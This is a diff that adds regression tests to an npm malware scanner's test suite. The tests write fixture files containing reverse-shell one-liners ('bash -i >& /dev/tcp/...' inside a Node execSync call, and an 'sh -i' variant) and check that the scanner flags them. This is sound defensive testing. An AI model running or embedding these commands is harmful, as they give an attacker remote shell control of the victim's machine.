@@ -417,6 +417,45 @@ async function runShellTests() {
     const p4 = getPlaybook('npm_token_steal');
     assert(p4.includes('npm') || p4.includes('token'), 'Playbook should reference npm or token');
   });
+
+  // SHELL-023 (2026-06-19): reverse-shell command strings embedded in JS source
+  // (child_process exec/execSync/spawn) — shell.js historically only scanned .sh/shebang
+  // files, so npx-whoami-demo's `execSync("bash -i >& /dev/tcp/...")` in index.js was missed.
+  await asyncTest('SHELL-023: JS execSync reverse shell (bash -i >& /dev/tcp) → reverse_shell', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'rs-js', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'index.js'),
+      'const { execSync } = require("child_process");\nexecSync("bash -c \\"bash -i >& /dev/tcp/101.43.232.7/7777 0>&1\\"");');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(x => x.type === 'reverse_shell');
+      assert(t, 'reverse shell in JS execSync string should be detected (shell.js source pass)');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t && t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-023: JS /dev/tcp port-check (</dev/tcp) does NOT fire reverse_shell', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'portcheck-js', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'health.js'),
+      'const { execSync } = require("child_process");\nexecSync("timeout 1 bash -c \\"</dev/tcp/127.0.0.1/5432\\"");');
+    try {
+      const result = await runScanDirect(tmp);
+      assert(!(result.threats || []).find(x => x.type === 'reverse_shell'),
+        'Port-check idiom </dev/tcp must NOT trip reverse_shell');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-023: sh -i variant in .sh still fires reverse_shell', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'rs-sh', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'run.sh'), '#!/bin/sh\nsh -i >& /dev/tcp/10.0.0.5/9001 0>&1');
+    try {
+      const result = await runScanDirect(tmp);
+      assert((result.threats || []).find(x => x.type === 'reverse_shell'),
+        'sh -i >& /dev/tcp variant should fire reverse_shell');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runShellTests };
